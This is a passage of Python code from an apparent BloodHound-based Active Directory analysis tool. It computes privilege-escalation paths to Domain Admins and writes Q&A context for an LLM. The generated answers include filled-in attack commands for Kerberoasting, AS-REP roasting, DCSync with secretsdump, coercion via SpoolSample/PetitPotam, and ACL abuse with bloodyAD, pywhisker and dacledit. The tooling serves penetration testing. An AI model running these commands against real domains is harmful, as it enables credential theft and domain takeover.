            # Add to general attack paths
            if ace_info['risk'] in ['CRITICAL', 'HIGH', 'MEDIUM']:
                self.facts['attack_paths'].append(attack_path)

            # Add to specific categories (same logic as _process_aces)
            if right_lower in ['getchanges', 'getchangesall']:
                if principal_name not in self.facts['dcsync_principals']:
                    self.facts['dcsync_principals'].append(principal_name)

            if right_lower == 'genericall':
                self.facts['genericall_paths'].append(attack_path)

            if right_lower == 'addmember':
                self.facts['addmember_paths'].append(attack_path)

            if right_lower == 'adminto':
                self.facts['adminto_paths'].append(attack_path)

            if right_lower == 'writedacl':
                self.facts['writedacl_paths'].append(attack_path)

            if right_lower == 'writeowner':
                self.facts['writeowner_paths'].append(attack_path)

            if right_lower == 'forcechangepassword':
                self.facts['forcechangepassword_paths'].append(attack_path)

            if right_lower == 'addkeycredentiallink':
                self.facts['shadow_credentials_paths'].append(attack_path)

            if right_lower == 'readlapspassword':
                self.facts['laps_readers'].append(attack_path)

            if right_lower == 'readgmsapassword':
                self.facts['gmsa_readers'].append(attack_path)

            if right_lower == 'canrdp':
                self.facts['canrdp_paths'].append(attack_path)

            if right_lower == 'canpsremote':
                self.facts['canpsremote_paths'].append(attack_path)

            if right_lower == 'sqladmin':
                self.facts['sqladmin_paths'].append(attack_path)

            if right_lower == 'allowedtodelegate':
                self.facts['constrained_delegation'].append({
                    'account': principal_name,
                    'targets': [target_name]
                })

    def _process_sessions(self, sessions: List[Dict]) -> None:
        """Process active sessions"""
        for session in sessions:
            user = session.get('UserName', 'UNKNOWN')
            computer = session.get('ComputerName', 'UNKNOWN')

            session_record = {
                'user': user,
                'computer': computer
            }

            self.facts['sessions'].append(session_record)

            # Identify critical sessions
            user_lower = user.lower()
            computer_lower = computer.lower()

            # Domain Admin session on workstation (credential theft risk)
            user_name = user_lower.split('@')[0].strip() if '@' in user_lower else user_lower
            is_da = any(da_pattern in user_lower for da_pattern in ['domain admins', 'enterprise admins']) or user_name == 'administrator'
            is_workstation = any(ws_pattern in computer_lower for ws_pattern in ['ws', 'desktop', 'laptop', 'workstation'])

            if is_da and is_workstation:
                self.facts['da_sessions_on_workstations'].append(session_record)

            # Any admin session
            if is_da or 'admin' in user_lower:
                self.facts['admin_sessions'].append(session_record)

    def _identify_critical_findings(self) -> None:
        """Post-processing: Identify and summarize critical findings"""

        # CRITICAL findings
        if self.facts['dcsync_principals']:
            for principal in self.facts['dcsync_principals']:
                self.facts['critical_findings'].append(
                    f"DCSync Rights: {principal} can replicate domain credentials"
                )

        if self.facts['unconstrained_delegation']:
            for account in self.facts['unconstrained_delegation']:
                if account not in self.facts['domain_controllers']:
                    self.facts['critical_findings'].append(
                        f"Unconstrained Delegation: {account} can impersonate any user"
                    )
                else:
                    self.facts['critical_findings'].append(
                        f"Unconstrained Delegation (DC): {account} is a Domain Controller with Unconstrained Delegation - exploitable via coercion (SpoolSample/PetitPotam)"
                    )

        if self.facts['shadow_credentials_paths']:
            for path in self.facts['shadow_credentials_paths']:
                self.facts['critical_findings'].append(
                    f"Shadow Credentials: {path['source']} can add key credential to {path['target']}"
                )

        if self.facts['password_not_required']:
            self.facts['critical_findings'].append(
                f"Password Not Required: {len(self.facts['password_not_required'])} accounts don't require passwords"
            )

        if self.facts['da_sessions_on_workstations']:
            self.facts['critical_findings'].append(
                f"Domain Admin Sessions on Workstations: {len(self.facts['da_sessions_on_workstations'])} credential theft opportunities"
            )

        # HIGH findings
        if self.facts['kerberoastable']:
            self.facts['high_findings'].append(
                f"Kerberoastable Accounts: {len(self.facts['kerberoastable'])} accounts with SPNs"
            )

        if self.facts['asrep_roastable']:
            self.facts['high_findings'].append(
                f"AS-REP Roastable Accounts: {len(self.facts['asrep_roastable'])} accounts without pre-auth"
            )

        if self.facts['genericall_paths']:
            self.facts['high_findings'].append(
                f"GenericAll Permissions: {len(self.facts['genericall_paths'])} full control relationships"
            )

        if self.facts['writedacl_paths']:
            self.facts['high_findings'].append(
                f"WriteDACL Permissions: {len(self.facts['writedacl_paths'])} can modify permissions"
            )

        if self.facts['forcechangepassword_paths']:
            self.facts['high_findings'].append(
                f"ForceChangePassword Rights: {len(self.facts['forcechangepassword_paths'])} password reset capabilities"
            )

    def _build_attack_chains(self) -> None:
        """
        PHASE 2: Build multi-hop attack path chains using BFS graph traversal.
        Pre-computes paths to high-value targets for complex queries.
        """
        # Build adjacency graph from all attack paths
        graph = defaultdict(list)  # {source: [(target, relationship, risk)]}

        # Add all attack path types to graph
        path_types = [
            ('genericall_paths', 'GenericAll', 'CRITICAL'),
            ('writedacl_paths', 'WriteDacl', 'CRITICAL'),
            ('writeowner_paths', 'WriteOwner', 'CRITICAL'),
            ('forcechangepassword_paths', 'ForceChangePassword', 'HIGH'),
            ('addmember_paths', 'AddMember', 'HIGH'),
            ('shadow_credentials_paths', 'AddKeyCredentialLink', 'CRITICAL'),
            ('adminto_paths', 'AdminTo', 'HIGH'),
            ('canrdp_paths', 'CanRDP', 'MEDIUM'),
            ('canpsremote_paths', 'CanPSRemote', 'HIGH'),
        ]

        for path_key, relationship, risk in path_types:
            for path in self.facts.get(path_key, []):
                source = path['source']
                target = path['target']
                graph[source].append((target, relationship, risk))

        # Add group membership edges (MemberOf relationship)
        for user, groups in self.facts.get('user_memberships', {}).items():
            for group in groups:
                graph[user].append((group, 'MemberOf', 'INFO'))

        # Add DCSync principals with direct paths
        for principal in self.facts.get('dcsync_principals', []):
            # DCSync gives direct path to domain compromise
            graph[principal].append(('DOMAIN', 'DCSync', 'CRITICAL'))

        # Pre-compute paths to Domain Admins
        da_targets = set(self.facts.get('domain_admins', []))
        if da_targets:
            # CRITICAL FIX: Exclude Domain Admins and Enterprise Admins as starting principals
            excluded_starts = set(self.facts.get('domain_admins', [])) | set(self.facts.get('enterprise_admins', []))
            self.facts['paths_to_da'] = self._find_paths_to_targets(graph, da_targets, max_paths=20, max_depth=5, excluded_starts=excluded_starts)
            if self.facts['paths_to_da']:
                self.facts['shortest_path_to_da'] = min(self.facts['paths_to_da'], key=lambda p: p['length'])

        # Pre-compute paths to Enterprise Admins
        ea_targets = set(self.facts.get('enterprise_admins', []))
        if ea_targets:
            self.facts['paths_to_ea'] = self._find_paths_to_targets(graph, ea_targets, max_paths=10, max_depth=5)

        # Pre-compute paths to Domain Controllers
        dc_targets = set(self.facts.get('domain_controllers', []))
        if dc_targets:
            self.facts['paths_to_dc'] = self._find_paths_to_targets(graph, dc_targets, max_paths=15, max_depth=5)
            # Identify vulnerable DCs (DCs with exploitable paths)
            vulnerable_dcs = set()
            for path in self.facts['paths_to_dc']:
                if path['length'] <= 3:  # 3 hops or less = vulnerable
                    vulnerable_dcs.add(path['target'])
            self.facts['vulnerable_dcs'] = list(vulnerable_dcs)

        # Pre-compute paths to KRBTGT
        krbtgt = self.facts.get('krbtgt_account')
        if krbtgt:
            self.facts['paths_to_krbtgt'] = self._find_paths_to_targets(graph, {krbtgt}, max_paths=10, max_depth=5)

        # Determine fastest domain compromise path
        all_critical_paths = []

        # Paths to DA
        if self.facts.get('paths_to_da'):
            all_critical_paths.extend(self.facts['paths_to_da'])

        # Paths to EA (if different from DA)
        if self.facts.get('paths_to_ea'):
            all_critical_paths.extend(self.facts['paths_to_ea'])

        # DCSync principals (instant compromise)
        if self.facts.get('dcsync_principals'):
            for principal in self.facts['dcsync_principals'][:5]:
                all_critical_paths.append({
                    'source': principal,
                    'target': 'DOMAIN',
                    'path': [principal, 'DOMAIN'],
                    'methods': ['DCSync'],
                    'length': 1,
                    'risk': 'CRITICAL'
                })

        # Find fastest path (shortest length, highest risk)
        if all_critical_paths:
            # Sort by length first, then by risk
            risk_priority = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2}
            all_critical_paths.sort(key=lambda p: (p['length'], risk_priority.get(p.get('risk', 'MEDIUM'), 3)))
            self.facts['fastest_domain_compromise'] = all_critical_paths[0]

    def _find_paths_to_targets(self, graph: Dict, targets: Set[str], max_paths: int = 10, max_depth: int = 5, excluded_starts: Set[str] = None) -> List[Dict]:
        """
        Find attack paths to target principals using BFS.

        Args:
            graph: Adjacency list {source: [(target, relationship, risk)]}
            targets: Set of target principals to find paths to
            max_paths: Maximum number of paths to return
            max_depth: Maximum path length to explore
            excluded_starts: Set of principals to exclude as starting points (e.g., Domain Admins)

        Returns:
            List of path dicts with {source, target, path, methods, length, risk}
        """
        found_paths = []
        if excluded_starts is None:
            excluded_starts = set()

        # Get all starting points (all principals in graph)
        all_principals = set(graph.keys())

        # BFS from each starting point
        for start in all_principals:
            if start in targets:
                continue  # Don't start from target itself
            if start in excluded_starts:
                continue  # CRITICAL FIX: Don't start from excluded principals (DA/EA)

            # BFS queue: (current_node, path, methods, max_risk)
            queue = [(start, [start], [], 'INFO')]
            visited = {start}

            while queue and len(found_paths) < max_paths:
                current, path, methods, max_risk = queue.pop(0)

                # Check if we reached max depth
                if len(path) > max_depth:
                    continue

                # Explore neighbors
                for neighbor, relationship, risk in graph.get(current, []):
                    # Check if we reached a target
                    if neighbor in targets:
                        # Found a path!
                        final_path = path + [neighbor]
                        final_methods = methods + [relationship]

                        # Determine overall risk (highest risk in chain)
                        risk_levels = {'CRITICAL': 3, 'HIGH': 2, 'MEDIUM': 1, 'INFO': 0}
                        overall_risk = max(risk, max_risk, key=lambda r: risk_levels.get(r, 0))

                        found_paths.append({
                            'source': start,
                            'target': neighbor,
                            'path': final_path,
                            'methods': final_methods,
                            'length': len(final_path) - 1,  # Number of hops
                            'risk': overall_risk
                        })

                        if len(found_paths) >= max_paths:
                            break
                        continue

                    # Add to queue if not visited
                    if neighbor not in visited:
                        visited.add(neighbor)
                        new_path = path + [neighbor]
                        new_methods = methods + [relationship]

                        # Update max risk
                        risk_levels = {'CRITICAL': 3, 'HIGH': 2, 'MEDIUM': 1, 'INFO': 0}
                        new_max_risk = max(risk, max_risk, key=lambda r: risk_levels.get(r, 0))

                        queue.append((neighbor, new_path, new_methods, new_max_risk))

        # Sort by length (shortest first), then by risk (highest first)
        risk_priority = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'INFO': 3}
        found_paths.sort(key=lambda p: (p['length'], risk_priority.get(p['risk'], 4)))

        return found_paths[:max_paths]

    def facts_to_text(self, facts: Dict[str, Any]) -> str:
        """
        Convert extracted facts to Q&A format for RAG context.
        Mirrors the Nmap facts_to_text() function structure.

        Args:
            facts: Dictionary of extracted facts

        Returns:
            String in Q&A format for LLM context
        """
        lines = []
        lines.append("=" * 80)
        lines.append("BLOODHOUND ACTIVE DIRECTORY SCAN - EXTRACTED FACTS")
        lines.append("=" * 80)
        lines.append("")

        # 0. CRITICAL FINDINGS UP-FRONT (survives truncation)
        # Build a compact summary of the most important findings so the LLM always sees them
        _top_findings = []
        if facts.get('unconstrained_delegation'):
            non_dc_ud = [a for a in facts['unconstrained_delegation'] if a not in facts.get('domain_controllers', [])]
            dc_ud = [a for a in facts['unconstrained_delegation'] if a in facts.get('domain_controllers', [])]
            if non_dc_ud:
                _top_findings.append(f"UNCONSTRAINED DELEGATION (non-DC): {', '.join(non_dc_ud[:5])} - can capture ANY user's TGT")
            if dc_ud:
                _top_findings.append(f"UNCONSTRAINED DELEGATION (DC): {', '.join(dc_ud[:5])} - exploitable via SpoolSample/PetitPotam coercion")
        if facts.get('dcsync_principals'):
            unique_dc = list(set(facts['dcsync_principals']))
            _top_findings.append(f"DCSYNC RIGHTS: {', '.join(unique_dc[:5])} can replicate domain credentials")
        if facts.get('shadow_credentials_paths'):
            _top_findings.append(f"SHADOW CREDENTIALS: {len(facts['shadow_credentials_paths'])} AddKeyCredentialLink paths found")
        if facts.get('genericall_paths'):
            _top_findings.append(f"GENERICALL: {len(facts['genericall_paths'])} full-control permissions found")
        if facts.get('writedacl_paths'):
            _top_findings.append(f"WRITEDACL: {len(facts['writedacl_paths'])} DACL modification rights found")
        if facts.get('password_not_required'):
            _top_findings.append(f"PASSWORD NOT REQUIRED: {len(facts['password_not_required'])} accounts")
        if facts.get('kerberoastable'):
            _top_findings.append(f"KERBEROASTABLE: {len(facts['kerberoastable'])} accounts with SPNs")
        if facts.get('asrep_roastable'):
            _top_findings.append(f"AS-REP ROASTABLE: {len(facts['asrep_roastable'])} accounts")

        if _top_findings:
            lines.append("--- CRITICAL FINDINGS SUMMARY (TOP PRIORITY) ---")
            lines.append(f"Q: What are the most critical security findings in this scan?")
            lines.append(f"A: {len(_top_findings)} critical categories found:")
            for i, f in enumerate(_top_findings):
                lines.append(f"   {i+1}. {f}")
            lines.append("")

        # 1. DOMAIN METADATA
        lines.append("--- DOMAIN INFORMATION ---")
        lines.append(f"Q: What is the domain name?")
        lines.append(f"A: {facts['domain_name'] if facts['domain_name'] else 'Not specified in this data'}")
        lines.append("")

        if facts['domain_sid']:
            lines.append(f"Q: What is the domain SID?")
            lines.append(f"A: {facts['domain_sid']}")
            lines.append("")

        if facts['collection_date']:
            lines.append(f"Q: When was this data collected?")
            lines.append(f"A: {facts['collection_date']}")
            lines.append("")

        # 2. OBJECT STATISTICS
        lines.append("--- ENVIRONMENT STATISTICS ---")
        stats = facts['stats']

        lines.append(f"Q: How many users were scanned?")
        lines.append(f"A: {stats['total_users']} total users ({stats['enabled_users']} enabled, {stats['disabled_users']} disabled)")
        lines.append("")

        lines.append(f"Q: How many computers were scanned?")
        lines.append(f"A: {stats['total_computers']} total computers ({stats['enabled_computers']} enabled, {stats['disabled_computers']} disabled)")
        lines.append("")

        lines.append(f"Q: How many groups were scanned?")
        lines.append(f"A: {stats['total_groups']} groups")
        lines.append("")

        if stats['total_gpos'] > 0:
            lines.append(f"Q: How many GPOs exist?")
            lines.append(f"A: {stats['total_gpos']} Group Policy Objects")
            lines.append("")

        # 3. DOMAIN CONTROLLERS
        lines.append("--- DOMAIN CONTROLLERS ---")
        lines.append(f"Q: Which computers are Domain Controllers?")
        if facts['domain_controllers']:
            lines.append(f"A: {', '.join(facts['domain_controllers'])}")
        else:
            lines.append(f"A: No Domain Controllers identified in this data")
        lines.append("")

        # 3.5. COMPUTER DETAILS (IP addresses, OS versions) - CRITICAL FOR Q&A
        if facts.get('computer_details'):
            lines.append("--- COMPUTER DETAILS (IP ADDRESSES, OS VERSIONS) ---")

            # Provide overview
            lines.append(f"Q: What computers were found and what are their IP addresses?")
            comp_list = []
            for comp_name, details in facts['computer_details'].items():
                if details.get('ip'):
                    comp_list.append(f"{comp_name} (IP: {details['ip']})")
                else:
                    comp_list.append(comp_name)

            if comp_list:
                lines.append(f"A: {len(comp_list)} computers with details:")
                for comp in comp_list[:20]:
                    lines.append(f"   - {comp}")
                if len(comp_list) > 20:
                    lines.append(f"   ... and {len(comp_list) - 20} more")
            lines.append("")

            # Provide individual computer Q&A for each computer
            for comp_name, details in list(facts['computer_details'].items())[:10]:
                lines.append(f"Q: What is the IP address of {comp_name}?")
                if details.get('ip'):
                    lines.append(f"A: {details['ip']}")
                else:
                    lines.append(f"A: IP address not found in scan data for {comp_name}")
                lines.append("")

                lines.append(f"Q: What is the operating system of {comp_name}?")
                if details.get('os'):
                    os_info = details['os']
                    if details.get('os_version'):
                        os_info += f" (version {details['os_version']})"
                    lines.append(f"A: {os_info}")
                else:
                    lines.append(f"A: Operating system not found in scan data for {comp_name}")
                lines.append("")

                # OS Build-specific vulnerability questions
                if details.get('os_version'):
                    lines.append(f"Q: Is {comp_name} (build {details['os_version']}) vulnerable to ZeroLogon (CVE-2020-1472)?")
                    lines.append(f"A: Build {details['os_version']} may be vulnerable to CVE-2020-1472 if unpatched. Windows Server 2016 build 14393 is vulnerable without security updates.")
                    lines.append("")

        # 4. HIGH-VALUE TARGETS
        lines.append("--- HIGH-VALUE TARGETS ---")

        lines.append(f"Q: Who are the Domain Admins?")
        if facts['domain_admins']:
            lines.append(f"A: {', '.join(facts['domain_admins'][:20])}")
            if len(facts['domain_admins']) > 20:
                lines.append(f"   ... and {len(facts['domain_admins']) - 20} more")
        else:
            lines.append(f"A: No Domain Admins group members found in this data")
        lines.append("")

        if facts['enterprise_admins']:
            lines.append(f"Q: Who are the Enterprise Admins?")
            lines.append(f"A: {', '.join(facts['enterprise_admins'][:20])}")
            lines.append("")

        if facts['administrators']:
            lines.append(f"Q: Who are in the Administrators group?")
            lines.append(f"A: {', '.join(facts['administrators'][:20])}")
            lines.append("")

        if facts['backup_operators']:
            lines.append(f"Q: Who are the Backup Operators?")
            lines.append(f"A: {', '.join(facts['backup_operators'][:10])}")
            lines.append("")

        if facts['admincount_users']:
            lines.append(f"Q: Which users have AdminCount=1 (protected accounts)?")
            lines.append(f"A: {len(facts['admincount_users'])} accounts: {', '.join(facts['admincount_users'][:15])}")
            if len(facts['admincount_users']) > 15:
                lines.append(f"   ... and {len(facts['admincount_users']) - 15} more")
            lines.append("")

        if facts['krbtgt_account']:
            lines.append(f"Q: What is the KRBTGT account?")
            lines.append(f"A: {facts['krbtgt_account']}")
            lines.append("")

        # 5. KERBEROASTING
        lines.append("--- KERBEROASTING OPPORTUNITIES ---")
        lines.append(f"Q: Which users are Kerberoastable (have SPNs)?")
        if facts['kerberoastable']:
            lines.append(f"A: YES - {len(facts['kerberoastable'])} accounts are vulnerable to Kerberoasting:")
            for i, kerb in enumerate(facts['kerberoastable'][:10]):
                spn_list = ', '.join(kerb['spns']) if isinstance(kerb['spns'], list) else str(kerb['spns'])
                lines.append(f"   {i+1}. {kerb['account']} - SPNs: {spn_list}")
            if len(facts['kerberoastable']) > 10:
                lines.append(f"   ... and {len(facts['kerberoastable']) - 10} more")
            lines.append("")

            # CRITICAL FIX: Add exploitation commands with correct syntax
            lines.append(f"Q: How do I Kerberoast {facts['kerberoastable'][0]['account']}?")
            domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
            target_account = facts['kerberoastable'][0]['account'].split('@')[0] if '@' in facts['kerberoastable'][0]['account'] else facts['kerberoastable'][0]['account']
            lines.append(f"A: Use GetUserSPNs.py with valid domain credentials:")
            lines.append(f"   GetUserSPNs.py {domain}/username:password -request -dc-ip <DC_IP> -outputfile kerberoast.txt")
            lines.append(f"   hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt")
            lines.append(f"   NOTE: Replace 'username:password' with valid credentials of ANY domain user")
            lines.append(f"   SOURCE: Impacket GetUserSPNs.py - Test syntax before use in engagement")
            lines.append("")

            # CRITICAL FIX: Add explicit permissions for each Kerberoastable account to prevent hallucination
            for kerb in facts['kerberoastable'][:1]:  # Top 1 Kerberoastable account (context window)
                account_name = kerb['account']
                lines.append(f"Q: What permissions does {account_name} have?")
                lines.append(f"A: {account_name} is Kerberoastable with SPNs: {', '.join(kerb['spns']) if isinstance(kerb['spns'], list) else kerb['spns']}")

                # Check group memberships
                if account_name in facts.get('user_memberships', {}):
                    groups = facts['user_memberships'][account_name]
                    lines.append(f"   Member of: {', '.join(groups[:5])}")
                    # Check if member of high-value groups
                    if account_name in facts.get('domain_admins', []):
                        lines.append(f"   WARNING: This account is a Domain Admin")
                    elif account_name in facts.get('enterprise_admins', []):
                        lines.append(f"   WARNING: This account is an Enterprise Admin")
                else:
                    lines.append(f"   Group memberships: Not found in scan data")

                # Check for dangerous ACL permissions
                dangerous_perms = []
                for path in facts.get('genericall_paths', []):
                    if path['source'] == account_name:
                        dangerous_perms.append(f"GenericAll on {path['target']}")
                for path in facts.get('writedacl_paths', []):
                    if path['source'] == account_name:
                        dangerous_perms.append(f"WriteDacl on {path['target']}")
                for path in facts.get('adminto_paths', []):
                    if path['source'] == account_name:
                        dangerous_perms.append(f"AdminTo on {path['target']}")

                if dangerous_perms:
                    lines.append(f"   Dangerous permissions: {', '.join(dangerous_perms[:3])}")
                    if len(dangerous_perms) > 3:
                        lines.append(f"   ... and {len(dangerous_perms) - 3} more permissions")
                else:
                    lines.append(f"   Dangerous permissions: None found in scan data")
                lines.append("")
        else:
            lines.append(f"A: NO - No users with SPNs (hasspn=true) were found")
        lines.append("")

        # 6. AS-REP ROASTING
        lines.append("--- AS-REP ROASTING OPPORTUNITIES ---")
        lines.append(f"Q: Which users are AS-REP Roastable (pre-auth not required)?")
        if facts['asrep_roastable']:
            lines.append(f"A: YES - {len(facts['asrep_roastable'])} accounts don't require pre-authentication:")
            lines.append(f"   {', '.join(facts['asrep_roastable'][:15])}")
            if len(facts['asrep_roastable']) > 15:
                lines.append(f"   ... and {len(facts['asrep_roastable']) - 15} more")
            lines.append("")

            # CRITICAL FIX: Add exploitation commands with correct syntax
            lines.append(f"Q: How do I AS-REP Roast {facts['asrep_roastable'][0]}?")
            domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
            target = facts['asrep_roastable'][0].split('@')[0] if '@' in facts['asrep_roastable'][0] else facts['asrep_roastable'][0]
            lines.append(f"A: Use GetNPUsers.py (no credentials required):")
            lines.append(f"   GetNPUsers.py {domain}/{target} -no-pass -dc-ip <DC_IP>")
            lines.append(f"   GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -no-pass -dc-ip <DC_IP> -outputfile asrep.txt")
            lines.append(f"   hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt")
        else:
            lines.append(f"A: NO - No users with dontreqpreauth=true were found")
        lines.append("")

        # 7. UNCONSTRAINED DELEGATION
        lines.append("--- UNCONSTRAINED DELEGATION ---")
        lines.append(f"Q: Are there any accounts with Unconstrained Delegation?")
        if facts['unconstrained_delegation']:
            non_dc = [acc for acc in facts['unconstrained_delegation'] if acc not in facts['domain_controllers']]
            dc_with_ud = [acc for acc in facts['unconstrained_delegation'] if acc in facts['domain_controllers']]
            if non_dc:
                lines.append(f"A: CRITICAL - {len(non_dc)} non-DC accounts with Unconstrained Delegation:")
                lines.append(f"   {', '.join(non_dc[:10])}")
                lines.append(f"   These accounts can capture TGTs from ANY user that authenticates to them.")
                lines.append(f"   Exploit: Rubeus.exe monitor /interval:5 /nowrap")
                lines.append(f"   Exploit: Use SpoolSample/PrinterBug to coerce authentication from DCs.")
            if dc_with_ud:
                lines.append(f"A: {len(dc_with_ud)} Domain Controller(s) also have Unconstrained Delegation:")
                lines.append(f"   {', '.join(dc_with_ud[:10])}")
                lines.append(f"   DCs with Unconstrained Delegation are STILL exploitable via coercion attacks.")
                lines.append(f"   Any service that authenticates to {dc_with_ud[0]} will have its TGT captured.")
                lines.append(f"   Exploit: SpoolSample.exe {dc_with_ud[0]} <attacker>  OR  PetitPotam.py <attacker> {dc_with_ud[0]}")
                lines.append(f"   Exploit: Rubeus.exe monitor /interval:5 /nowrap (on compromised DC)")
                lines.append(f"   This makes {dc_with_ud[0]} a HIGH-VALUE intermediate target for lateral movement.")
            if not non_dc and not dc_with_ud:
                lines.append(f"A: Accounts found but could not classify (check data)")
        else:
            lines.append(f"A: NO - No accounts with unconstraineddelegation=true found")
        lines.append("")

        # 8. CONSTRAINED DELEGATION
        if facts['constrained_delegation']:
            lines.append("--- CONSTRAINED DELEGATION ---")
            lines.append(f"Q: Which accounts have Constrained Delegation?")
            lines.append(f"A: {len(facts['constrained_delegation'])} accounts:")
            for i, cd in enumerate(facts['constrained_delegation'][:5]):
                targets = ', '.join(cd['targets']) if isinstance(cd['targets'], list) else str(cd['targets'])
                lines.append(f"   {i+1}. {cd['account']} can delegate to: {targets}")
            if len(facts['constrained_delegation']) > 5:
                lines.append(f"   ... and {len(facts['constrained_delegation']) - 5} more")
            lines.append("")

        # 9. PASSWORD VULNERABILITIES
        if facts['password_not_required']:
            lines.append("--- PASSWORD VULNERABILITIES ---")
            lines.append(f"Q: Which accounts don't require passwords?")
            lines.append(f"A: CRITICAL - {len(facts['password_not_required'])} accounts with passwordnotreqd=true:")
            lines.append(f"   {', '.join(facts['password_not_required'][:10])}")
            lines.append("")

        if facts['password_never_expires']:
            lines.append(f"Q: Which accounts have passwords that never expire?")
            lines.append(f"A: {len(facts['password_never_expires'])} accounts:")
            lines.append(f"   {', '.join(facts['password_never_expires'][:15])}")
            if len(facts['password_never_expires']) > 15:
                lines.append(f"   ... and {len(facts['password_never_expires']) - 15} more")
            lines.append("")

        # 10. DCSYNC RIGHTS
        lines.append("--- DCSYNC RIGHTS ---")
        lines.append(f"Q: Which principals have DCSync rights (GetChanges/GetChangesAll)?")
        if facts['dcsync_principals']:
            # Remove duplicates
            unique_dcsync = list(set(facts['dcsync_principals']))
            lines.append(f"A: CRITICAL - {len(unique_dcsync)} principals can replicate domain credentials:")
            lines.append(f"   {', '.join(unique_dcsync[:15])}")
            lines.append("")

            # CRITICAL FIX: Add exploitation commands with correct syntax
            lines.append(f"Q: How do I perform DCSync with {unique_dcsync[0]}?")
            domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
            principal = unique_dcsync[0].split('@')[0] if '@' in unique_dcsync[0] else unique_dcsync[0]
            lines.append(f"A: Use secretsdump.py with compromised credentials:")
            lines.append(f"   secretsdump.py {domain}/{principal}:password@<DC_IP> -just-dc-ntlm -outputfile domain_hashes")
            lines.append(f"   secretsdump.py {domain}/{principal}:password@<DC_IP> -just-dc-user krbtgt")
            lines.append(f"   NOTE: Replace 'password' with actual password or use -hashes :NTHASH")
            lines.append(f"   SOURCE: Impacket secretsdump.py - Test syntax before use in engagement")
        else:
            lines.append(f"A: NO - No explicit DCSync rights found in this data")
        lines.append("")

        # 11. GENERICALL PATHS (FIXED: Per-target Q&A like Nmap)
        if facts['genericall_paths']:
            lines.append("--- GENERICALL (FULL CONTROL) PERMISSIONS ---")
            lines.append(f"Q: Which principals have GenericAll (full control) over other objects?")
            lines.append(f"A: {len(facts['genericall_paths'])} GenericAll relationships found:")
            for i, path in enumerate(facts['genericall_paths'][:3]):
                lines.append(f"   {i+1}. {path['source']} has GenericAll on {path['target']}")
            if len(facts['genericall_paths']) > 3:
                lines.append(f"   ... and {len(facts['genericall_paths']) - 3} more")
            lines.append("")

            # CRITICAL FIX: Add per-target Q&A (like Nmap does for ports)
            # Group paths by target for specific queries
            paths_by_target = {}
            for path in facts['genericall_paths']:
                target = path['target']
                if target not in paths_by_target:
                    paths_by_target[target] = []
                paths_by_target[target].append(path['source'])

            # Add per-target Q&A for top 3 targets (reduced for context window)
            for target, sources in list(paths_by_target.items())[:3]:
                lines.append(f"Q: Does anyone have GenericAll permissions on {target}?")
                lines.append(f"A: YES - {len(sources)} principal(s) have full control over {target}:")
                for source in sources[:2]:  # Top 2 sources per target
                    lines.append(f"   - {source}")
                if len(sources) > 2:
                    lines.append(f"   ... and {len(sources) - 2} more")
                lines.append("")

            # CRITICAL FIX: Add exploitation commands with correct syntax
            first_path = facts['genericall_paths'][0]
            domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
            lines.append(f"Q: How do I exploit GenericAll from {first_path['source']} to {first_path['target']}?")
            lines.append(f"A: GenericAll allows multiple exploitation paths:")
            lines.append(f"   # Password reset (if target is user):")
            lines.append(f"   bloodyAD.py -d {domain} -u 'username' -p 'password' set password '{first_path['target']}' 'NewPass123!' --dc-ip <DC_IP>")
            lines.append(f"   # Shadow Credentials (requires msDS-KeyCredentialLink support):")
            lines.append(f"   pywhisker.py -d {domain} -u 'username' -p 'password' --target '{first_path['target']}' --action add --dc-ip <DC_IP>")
            lines.append("")

        # 12. WRITEDACL PATHS (FIXED: Per-target Q&A like Nmap)
        if facts['writedacl_paths']:
            lines.append("--- WRITEDACL PERMISSIONS ---")
            lines.append(f"Q: Which principals can modify permissions (WriteDacl)?")
            lines.append(f"A: {len(facts['writedacl_paths'])} WriteDacl relationships:")
            for i, path in enumerate(facts['writedacl_paths'][:10]):
                lines.append(f"   {i+1}. {path['source']} can modify permissions on {path['target']}")
            if len(facts['writedacl_paths']) > 10:
                lines.append(f"   ... and {len(facts['writedacl_paths']) - 10} more")
            lines.append("")

            # CRITICAL FIX: Add per-target Q&A (like Nmap does for ports)
            # Group paths by target for specific queries
            paths_by_target = {}
            for path in facts['writedacl_paths']:
                target = path['target']
                if target not in paths_by_target:
                    paths_by_target[target] = []
                paths_by_target[target].append(path['source'])

            # Add per-target Q&A for top 3 targets (reduced for context window)
            for target, sources in list(paths_by_target.items())[:3]:
                lines.append(f"Q: Can anyone modify permissions on {target}?")
                lines.append(f"A: YES - {len(sources)} principal(s) can modify permissions on {target} via WriteDacl:")
                for source in sources[:2]:  # Top 2 sources per target
                    lines.append(f"   - {source}")
                if len(sources) > 2:
                    lines.append(f"   ... and {len(sources) - 2} more")
                lines.append("")

            # CRITICAL FIX: Add exploitation commands with correct syntax
            first_path = facts['writedacl_paths'][0]
            domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
            lines.append(f"Q: How do I exploit WriteDacl from {first_path['source']} to {first_path['target']}?")
            lines.append(f"A: Use WriteDacl to grant yourself GenericAll:")
            lines.append(f"   dacledit.py -action write -rights FullControl -principal '{first_path['source']}' -target '{first_path['target']}' -dc-ip <DC_IP> '{domain}/username:password'")
            lines.append(f"   # Then exploit GenericAll as shown above")
            lines.append("")

        # 13. FORCECHANGEPASSWORD PATHS (FIXED: Per-target Q&A like Nmap)
        if facts['forcechangepassword_paths']:
            lines.append("--- FORCECHANGEPASSWORD RIGHTS ---")
            lines.append(f"Q: Which principals can force password resets?")
            lines.append(f"A: {len(facts['forcechangepassword_paths'])} ForceChangePassword relationships:")
            for i, path in enumerate(facts['forcechangepassword_paths'][:10]):
                lines.append(f"   {i+1}. {path['source']} can reset password for {path['target']}")
            if len(facts['forcechangepassword_paths']) > 10:
                lines.append(f"   ... and {len(facts['forcechangepassword_paths']) - 10} more")
            lines.append("")

            # CRITICAL FIX: Add per-target Q&A (like Nmap does for ports)
            # Group paths by target for specific queries
            paths_by_target = {}
            for path in facts['forcechangepassword_paths']:
                target = path['target']
                if target not in paths_by_target:
                    paths_by_target[target] = []
